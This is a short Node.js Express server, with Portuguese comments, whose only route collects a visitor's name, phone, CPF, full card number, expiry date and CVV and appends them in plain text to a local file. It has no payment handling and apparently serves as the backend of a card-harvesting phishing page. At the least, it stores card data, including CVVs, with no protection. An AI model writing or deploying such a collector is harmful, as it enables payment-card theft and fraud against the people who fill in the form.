const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para lidar com dados do formulário
app.use(express.urlencoded({ extended: true })); // Substituído body-parser
app.use(express.json()); // Substituído body-parser

// Servir arquivos estáticos da pasta public
app.use(express.static(path.join(__dirname, 'public')));

// Mensagem de depuração
console.log('Diretório atual:', __dirname);

// Rota para receber os dados do formulário
app.post('/submit', (req, res) => {
  const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
  
  // Aqui você pode adicionar validação dos dados se necessário

  const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;

  // Salvar os dados em um arquivo txt
  fs.appendFile('dados.txt', data, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados:', err);
      return res.status(500).send('Erro ao salvar os dados.');
    }
    res.send('Dados enviados com sucesso!');
  });
});

// Middleware para tratamento de erros
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Ocorreu um erro!');
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
